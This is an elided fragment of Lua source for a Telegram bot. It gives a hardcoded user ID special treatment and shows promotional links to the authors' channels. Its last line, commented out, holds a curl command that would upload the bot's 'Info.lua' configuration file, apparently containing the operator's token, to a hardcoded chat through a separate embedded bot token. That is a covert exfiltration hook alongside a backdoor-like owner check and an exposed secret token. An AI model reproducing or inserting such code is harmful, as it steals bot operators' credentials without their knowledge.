...
if tonumber(user_id) == tonumber(1786981339) then  
var = true  
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '☆ 𝐄𝐋𝐊𝐇𝐀𝐖𝐀𝐉𝐀𝐇 ☆ ',url="t.me/ELkhawajah"}},
{{text = '☆ 𝐁𝐀𝐑𝐋𝐎𝟎𝐎 ☆',url="t.me/bar_lo0o0"}},
{{text = '☁️ 𝕊𝕆𝕌ℝℂ𝔼 𝔼𝕃𝕂ℍ𝔸𝕎𝔸𝕁𝔸ℍ ☁️', url="t.me/BARLO0Obot"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
...
if result.sender_user_id_ == tonumber(1786981339) then
...
--local curl = 'curl "'..'https://api.telegram.org/bot1564973291:AAF2IwSno-EITmF3sGz40dGXKVNKNaUn0wI/sendDocument'..'" -F "chat_id='.. 1786981339 ..'" -F "document=@'..'Info.lua'..'"' io.popen(curl)
------------------------------------------------------------------------
